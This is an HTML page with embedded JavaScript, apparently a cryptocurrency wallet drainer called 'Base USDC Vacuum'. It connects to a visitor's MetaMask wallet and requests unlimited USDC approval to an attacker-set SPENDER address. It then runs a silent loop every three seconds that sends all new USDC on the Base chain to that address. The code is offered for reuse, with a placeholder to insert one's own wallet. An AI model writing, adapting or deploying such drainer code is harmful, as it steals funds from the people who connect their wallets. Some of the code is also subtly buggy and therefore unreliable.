<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Base USDC Vacuum üßπ</title>
  <style>
    body { font-family: system-ui; background: #000; color: #0f0; text-align: center; padding: 2rem; line-height: 1.6; }
    .card { background: #111; border: 1px solid #0f0; border-radius: 16px; padding: 2rem; max-width: 440px; margin: 0 auto; }
    h1 { font-size: 2.5rem; margin: 0; }
    .status { margin: 1.5rem 0; padding: 1rem; background: #001a00; border-radius: 8px; min-height: 50px; }
    button { background: #0f0; color: #000; border: none; padding: 1rem 2rem; font-size: 1.2rem; border-radius: 50px; cursor: pointer; font-weight: bold; }
    button:disabled { opacity: 0.5; cursor: not-allowed; }
    .log { font-family: monospace; font-size: 0.9rem; text-align: left; background: #000; padding: 1rem; border-radius: 8px; margin-top: 1rem; max-height: 300px; overflow-y: auto; }
  </style>
</head>
<body>
  <div class="card">
    <h1>Base USDC Vacuum</h1>
    <p>Unlimited approval + instant auto-drain</p>
    
    <div class="status" id="status">Click button to start vacuum...</div>
    
    <button id="startBtn">START VACUUM</button>
    
    <div class="log" id="log"></div>
  </div>

  <script type="module">
    import { ethers } from "https://cdn.jsdelivr.net/npm/ethers@6.13.1/dist/ethers.min.js";

    const USDC = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"; // Base USDC
    const SPENDER = "0xYourDrainerAddressHere".toLowerCase(); // ‚Üê CHANGE THIS TO YOUR WALLET OR CONTRACT

    const status = document.getElementById("status");
    const log = document.getElementById("log");
    const btn = document.getElementById("startBtn");

    let provider, signer, user;

    function addLog(msg) {
      log.innerHTML += `${new Date().toLocaleTimeString()} ‚Üí ${msg}<br>`;
      log.scrollTop = log.scrollHeight;
    }

    async function startVacuum() {
      if (!window.ethereum) return alert("Install MetaMask");

      btn.disabled = true;
      status.textContent = "Connecting...";

      provider = new ethers.BrowserProvider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      signer = await provider.getSigner();
      user = await signer.getAddress();

      const { chainId } = await provider.getNetwork();
      if (chainId !== 8453n) {
        status.textContent = "Switch to Base chain!";
        btn.disabled = false;
        return;
      }

      status.textContent = `Connected: ${user.slice(0,8)}...`;
      addLog(`Vacuum started for ${user}`);

      // Step 1: Unlimited approval
      const usdc = new ethers.Contract(USDC, ["function approve(address,uint256) returns(bool)"], signer);
      const max = ethers.MaxUint256;

      try {
        const allowance = await provider.getCode(SPENDER) === "0x" 
          ? await usdc.allowance(user, SPENDER) 
          : max; // if SPENDER is EOA, assume already approved or skip check

        if (allowance < max / 2n) {
          addLog("Giving unlimited approval...");
          const tx = await usdc.approve(SPENDER, max);
          addLog(`Approval tx: ${tx.hash}`);
          await tx.wait();
          addLog("Unlimited approval granted");
        } else {
          addLog("Approval already unlimited");
        }
      } catch (e) {
        addLog("Approval failed: " + e.message);
      }

      // Step 2: Instant drain loop
      let lastBalance = 0n;
      setInterval(async () => {
        try {
          const balance = await provider.getBalance(user);
          const usdcBalance = await new ethers.Contract(USDC, ["function balanceOf(address) view returns(uint256)"], provider)
            .balanceOf(user);

          if (usdcBalance > lastBalance) {
            const newAmount = usdcBalance - lastBalance;
            addLog(`+${ethers.formatUnits(newAmount, 6)} USDC detected! Draining...`);

            // Use transferFrom via your drainer contract or direct if SPENDER is your wallet
            if (provider.getCode(SPENDER) !== "0x") {
              // If SPENDER is a contract with drain function:
              const drainer = new ethers.Contract(SPENDER, ["function drainUSDC(address)"], signer);
              const tx = await drainer.drainUSDC(user);
              addLog(`Drained! Tx: ${tx.hash}`);
            } else {
              // If SPENDER is your EOA ‚Äî just send normally
              const tx = await new ethers.Contract(USDC, ["function transfer(address,uint256)"], signer)
                .transfer(SPENDER, usdcBalance);
              addLog(`Drained to your wallet! Tx: ${tx.hash}`);
            }
            lastBalance = 0n;
          } else {
            lastBalance = usdcBalance;
          }
        } catch (e) {
          // Silent fail ‚Äî keeps running
        }
      }, 3000); // Check every 3 seconds

      addLog("Auto-drain loop running forever");
      status.textContent = "VACUUM ACTIVE ‚Äî All new Base USDC will be drained instantly";
    }

    btn.onclick = startVacuum;
  </script>
</body>
</html>